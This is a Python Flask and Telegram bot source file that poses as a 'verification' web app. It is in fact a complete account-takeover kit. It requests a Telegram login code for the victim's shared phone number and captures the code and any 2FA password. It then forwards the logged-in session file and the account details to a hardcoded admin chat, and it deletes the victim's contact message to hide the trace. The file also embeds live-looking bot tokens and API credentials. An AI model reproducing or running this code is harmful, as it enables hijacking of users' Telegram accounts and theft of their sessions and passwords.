import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError, FloodWaitError
from flask import Flask, render_template, request, jsonify
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import uuid
import logging
import sys

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    stream=sys.stdout
)
logger = logging.getLogger(__name__)

# Initialize Flask
app = Flask(__name__)

# Configuration
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://itz-me-545-telegram.onrender.com')
PORT = int(os.environ.get('PORT', 10000))

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage - FIXED: Use single session storage
user_sessions = {}  # user_id -> session_data
session_expiry = 600  # 10 minutes
telegram_clients = {}

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            connection_retries=3,
            timeout=30
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop,
            'created': time.time()
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        logger.info(f"Connected to Telegram, sending OTP to {phone}")
        
        result = await client.send_code_request(phone)
        logger.info(f"OTP sent successfully to {phone}")
        
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except FloodWaitError as e:
        wait_time = e.seconds
        logger.warning(f"Flood wait: {wait_time} seconds")
        return {'success': False, 'error': f'Please wait {wait_time} seconds before trying again'}
    except Exception as e:
        error_msg = str(e)
        logger.error(f"Error sending OTP to {phone}: {error_msg}")
        
        if "PHONE_NUMBER_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone number format'}
        elif "PHONE_NUMBER_BANNED" in error_msg:
            return {'success': False, 'error': 'Phone number is banned'}
        elif "PHONE_CODE_EMPTY" in error_msg:
            return {'success': False, 'error': 'Phone code is empty'}
        elif "PHONE_CODE_EXPIRED" in error_msg:
            return {'success': False, 'error': 'Phone code expired'}
        elif "PHONE_CODE_INVALID" in error_msg:
            return {'success': False, 'error': 'Invalid phone code'}
        elif "SESSION_PASSWORD_NEEDED" in error_msg:
            return {'success': False, 'error': '2FA password needed'}
        else:
            return {'success': False, 'error': f'Failed to send OTP: {error_msg}'}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        logger.info(f"Verifying OTP for {phone}: {code}")
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            logger.info(f"Successfully verified {phone}, user: {me.username}")
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            logger.info(f"Verification succeeded but needs 2FA for {phone}")
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        logger.info(f"2FA needed for {phone}")
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        logger.warning(f"OTP expired for {phone}")
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        logger.warning(f"Invalid OTP for {phone}")
        return {'success': False, 'error': 'Invalid OTP code'}
    except Exception as e:
        error_str = str(e)
        logger.error(f"Verification error for {phone}: {error_str}")
        
        if 'password' in error_str.lower() or '2fa' in error_str.lower():
            return {'success': True, 'requires_2fa': True}
        elif 'code' in error_str.lower() and 'expired' in error_str.lower():
            return {'success': False, 'error': 'OTP expired', 'code_expired': True}
        else:
            return {'success': False, 'error': f'Verification failed: {error_str}'}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        logger.info(f"2FA successful for {me.phone}")
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        logger.error(f"2FA error: {e}")
        return {'success': False, 'error': f'Wrong password: {str(e)}'}

# ==================== FLASK ROUTES - FIXED ====================
@app.route('/')
def index():
    """Main WebApp page"""
    logger.info("Serving index.html")
    return render_template('index.html')

@app.route('/otp')
def otp_page():
    """OTP entry page - FIXED: Accepts both query params and session"""
    user_id = request.args.get('user_id')
    
    logger.info(f"OTP page requested for user_id: {user_id}")
    
    if not user_id:
        return "User ID not provided. Please share contact again.", 400
    
    if user_id not in user_sessions:
        logger.warning(f"Session not found for user_id: {user_id}")
        return "Session expired. Please share contact again.", 400
    
    session = user_sessions[user_id]
    logger.info(f"Serving OTP page for {session['phone']}")
    return render_template('otp.html', user_id=user_id, phone=session['phone'])

# NEW ENDPOINT: Initialize session for WebApp
@app.route('/api/init-session', methods=['POST'])
def init_session():
    """Initialize a session when WebApp opens"""
    try:
        data = request.json
        user_id = data.get('user_id')
        
        if not user_id:
            return jsonify({'success': False, 'error': 'User ID required'})
        
        # Create a pending session for this WebApp user
        user_sessions[user_id] = {
            'user_id': user_id,
            'status': 'waiting_for_contact',
            'created': datetime.now(),
            'expiry': datetime.now() + timedelta(seconds=session_expiry)
        }
        
        logger.info(f"Created pending session for WebApp user: {user_id}")
        
        return jsonify({
            'success': True,
            'message': 'Session initialized'
        })
    except Exception as e:
        logger.error(f"Error in init-session: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check-otp-sent/<user_id>', methods=['GET'])
def check_otp_sent(user_id):
    """Check if OTP has been sent for this user - FIXED"""
    try:
        logger.info(f"Checking OTP status for user_id: {user_id}")
        
        if user_id not in user_sessions:
            logger.warning(f"Session not found for user_id: {user_id}")
            return jsonify({'success': False, 'error': 'Session not found. Please share contact again.'})
        
        session = user_sessions[user_id]
        
        # Check if session expired
        if session['expiry'] < datetime.now():
            logger.warning(f"Session expired for user_id: {user_id}")
            del user_sessions[user_id]
            return jsonify({'success': False, 'error': 'Session expired. Please share contact again.'})
        
        if session.get('otp_sent'):
            logger.info(f"OTP sent for user_id: {user_id}, phone: {session['phone']}")
            return jsonify({
                'success': True,
                'otp_sent': True,
                'phone': session['phone']
            })
        else:
            # Check if contact was received but OTP not sent yet
            if session.get('status') == 'contact_received':
                return jsonify({
                    'success': True,
                    'otp_sent': False,
                    'contact_received': True,
                    'message': 'Contact received, sending OTP...'
                })
            else:
                return jsonify({
                    'success': True,
                    'otp_sent': False,
                    'contact_received': False,
                    'message': 'Waiting for contact...'
                })
    except Exception as e:
        logger.error(f"Error checking OTP status: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    """Verify OTP from WebApp"""
    try:
        data = request.json
        user_id = data.get('user_id')
        otp = data.get('otp', '')
        
        logger.info(f"Verifying OTP for user {user_id}: {otp}")
        
        if user_id not in user_sessions:
            logger.warning(f"Session not found for user_id: {user_id}")
            return jsonify({'success': False, 'error': 'Session expired. Please start over.'})
        
        session = user_sessions[user_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            logger.warning(f"Invalid OTP format from user_id: {user_id}")
            return jsonify({'success': False, 'error': 'Invalid OTP format. Enter 5 digits.'})
        
        # Check attempts
        session['otp_attempts'] = session.get('otp_attempts', 0) + 1
        if session['otp_attempts'] > 3:
            logger.warning(f"Too many attempts for user_id: {user_id}")
            # Delete contact message
            if session.get('contact_message_id'):
                try:
                    bot.delete_message(session['chat_id'], session['contact_message_id'])
                except:
                    pass
            del user_sessions[user_id]
            return jsonify({'success': False, 'error': 'Too many attempts. Please start over.'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        logger.info(f"Verifying OTP {cleaned_otp} for {session['phone']}")
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['status'] = 'needs_2fa'
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                logger.info(f"2FA required for {session['phone']}")
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA authentication required'
                })
            else:
                # Success
                logger.info(f"Verification successful for {session['phone']}")
                
                # Send to admin
                send_to_admin(session['phone'], result.get('user'))
                
                # Send session file
                send_session_to_admin(session['session_file'], session['phone'], has_2fa=False)
                
                # Delete contact message
                if session.get('contact_message_id'):
                    try:
                        bot.delete_message(session['chat_id'], session['contact_message_id'])
                        logger.info(f"Deleted contact message for {session['phone']}")
                    except Exception as e:
                        logger.error(f"Could not delete contact message: {e}")
                
                # Delete session
                del user_sessions[user_id]
                
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Account verified successfully'
                })
        else:
            if result.get('code_expired'):
                logger.warning(f"OTP expired for {session['phone']}")
                # Delete contact message
                if session.get('contact_message_id'):
                    try:
                        bot.delete_message(session['chat_id'], session['contact_message_id'])
                    except:
                        pass
                del user_sessions[user_id]
                return jsonify({'success': False, 'error': 'OTP expired. Please start over.'})
            
            logger.warning(f"Verification failed for {session['phone']}: {result.get('error')}")
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        logger.error(f"Error in verify-otp: {str(e)}")
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

# ==================== BOT HANDLERS - FIXED ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start_help(message):
    """Handle /start and /help commands - FIXED: Simple response"""
    try:
        logger.info(f"📨 Received /start from user_id: {message.from_user.id}")
        
        # Create WebApp URL
        webapp_url = f"{WEBHOOK_URL.rstrip('/')}"
        
        # Create inline keyboard with WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="📱 Open WebApp to Verify",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_btn)
        
        # Send SIMPLE message with button
        bot.send_message(
            message.chat.id,
            "Click below to verify:",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ Sent WebApp button to user_id: {message.from_user.id}")
        
    except Exception as e:
        logger.error(f"❌ Error in handle_start_help: {e}")

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sent from WebApp.requestContact() - FIXED"""
    try:
        contact = message.contact
        user_id = str(message.from_user.id)  # Telegram user ID
        chat_id = message.chat.id
        
        phone = contact.phone_number
        first_name = contact.first_name or ''
        last_name = contact.last_name or ''
        
        logger.info(f"📱 Contact received from user_id: {user_id}, phone: {phone}")
        
        # Format phone number
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Validate phone number
        if len(phone) < 8 or not re.match(r'^\+\d+$', phone):
            logger.warning(f"Invalid phone format: {phone}")
            return
        
        # Delete the contact message immediately
        try:
            bot.delete_message(chat_id, message.message_id)
            logger.info(f"✅ Deleted contact message for user_id: {user_id}")
        except Exception as e:
            logger.warning(f"Could not delete message: {e}")
        
        # Create or update user session with contact info
        if user_id not in user_sessions:
            user_sessions[user_id] = {
                'user_id': user_id,
                'chat_id': chat_id,
                'status': 'contact_received',
                'created': datetime.now(),
                'expiry': datetime.now() + timedelta(seconds=session_expiry)
            }
        
        # Update with contact info
        user_sessions[user_id].update({
            'phone': phone,
            'first_name': first_name,
            'last_name': last_name,
            'contact_message_id': message.message_id,
            'contact_received': True
        })
        
        logger.info(f"📞 Contact stored for user_id: {user_id}, phone: {phone}")
        
        # Generate session file
        session_file = generate_session_file(phone)
        
        # Store session file
        user_sessions[user_id]['session_file'] = session_file
        
        # Send OTP
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        logger.info(f"📨 Sending OTP to {phone}...")
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            user_sessions[user_id].update({
                'phone_code_hash': result['phone_code_hash'],
                'otp_sent': True,
                'otp_attempts': 0,
                'status': 'otp_sent',
                'expiry': datetime.now() + timedelta(seconds=session_expiry)
            })
            logger.info(f"✅ OTP sent successfully to {phone}")
            
            # Send notification to admin
            try:
                bot.send_message(
                    USER_ID,
                    f"""📲 <b>CONTACT RECEIVED</b>
                
👤 User ID: {user_id}
📱 Phone: {phone}
👤 Name: {first_name} {last_name}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
                
✅ <b>OTP sent successfully</b>""",
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.error(f"Admin notification error: {e}")
            
        else:
            user_sessions[user_id]['status'] = 'error'
            user_sessions[user_id]['error'] = result.get('error', 'Failed to send OTP')
            logger.error(f"❌ Failed to send OTP to {phone}: {result.get('error')}")
            
            # Send error to admin
            try:
                bot.send_message(
                    USER_ID,
                    f"""❌ <b>OTP SEND FAILED</b>
                    
👤 User ID: {user_id}
📱 Phone: {phone}
⚠️ Error: {result.get('error', 'Unknown error')}""",
                    parse_mode='HTML'
                )
            except:
                pass
            
            # Delete session on error
            if user_id in user_sessions:
                del user_sessions[user_id]
        
    except Exception as e:
        logger.error(f"❌ Contact handler error: {e}")

def send_to_admin(phone, user_info=None, password=None):
    """Send verification success to admin"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        msg = f"""📱 <b>NEW VERIFICATION</b>

📞 Phone: {phone}
⏰ Time: {timestamp}
🌐 Source: WebApp"""
        
        if user_info:
            full_name = f"{user_info.get('first_name', '')} {user_info.get('last_name', '')}".strip()
            if full_name:
                msg += f"\n👤 Name: {full_name}"
            if user_info.get('username'):
                msg += f"\n🔗 Username: @{user_info.get('username')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        
        if password:
            msg += f"\n🔐 2FA Password: <code>{password}</code>"
        
        msg += f"\n\n✅ <b>VERIFICATION SUCCESSFUL</b>"
        
        bot.send_message(USER_ID, msg, parse_mode='HTML')
        logger.info(f"Admin notification sent for {phone}")
        return True
    except Exception as e:
        logger.error(f"Admin notification error: {e}")
        return False

def send_session_to_admin(session_file, phone, has_2fa=False):
    """Send session file to admin"""
    try:
        if os.path.exists(session_file):
            with open(session_file, 'rb') as f:
                caption = f"""✅ {'2FA ' if has_2fa else ''}Session File
📱 Phone: {phone}
⏰ Time: {datetime.now().strftime('%H:%M:%S')}
🌐 Source: WebApp"""
                
                bot.send_document(USER_ID, f, caption=caption)
                logger.info(f"Session file sent to admin for {phone}")
                return True
    except Exception as e:
        logger.error(f"Failed to send session file: {e}")
    return False

@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle Telegram webhook"""
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            update = telebot.types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return 'OK', 200
        return 'Bad Request', 400
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return 'Internal Server Error', 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.now().isoformat(),
        'sessions_count': len(user_sessions),
        'bot_ready': True,
        'webhook_url': WEBHOOK_URL,
        'port': PORT
    })

@app.route('/debug')
def debug_info():
    """Debug endpoint"""
    sessions_info = {}
    for user_id, session in user_sessions.items():
        sessions_info[user_id] = {
            'phone': session.get('phone'),
            'otp_sent': session.get('otp_sent', False),
            'status': session.get('status'),
            'expiry': session['expiry'].isoformat() if 'expiry' in session else None
        }
    
    return jsonify({
        'user_sessions': sessions_info,
        'sessions_count': len(user_sessions),
        'timestamp': datetime.now().isoformat(),
        'webhook_url': WEBHOOK_URL
    })

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions"""
    while True:
        time.sleep(60)
        current_time = datetime.now()
        expired_users = []
        
        for user_id, session in user_sessions.items():
            if session['expiry'] < current_time:
                expired_users.append(user_id)
        
        for user_id in expired_users:
            del user_sessions[user_id]
        
        if expired_users:
            logger.info(f"🧹 Cleanup: Removed {len(expired_users)} expired sessions")

# ==================== MAIN ====================
if __name__ == '__main__':
    logger.info("="*60)
    logger.info("🚀 Telegram WebApp Verification Bot - FIXED VERSION")
    logger.info("="*60)
    logger.info(f"🤖 Bot Token: {BOT_TOKEN[:8]}...")
    logger.info(f"👤 User ID: {USER_ID}")
    logger.info(f"🌐 Webhook URL: {WEBHOOK_URL}")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_loop, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Run Flask
    logger.info(f"🌐 Starting Flask server on port {PORT}")
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)
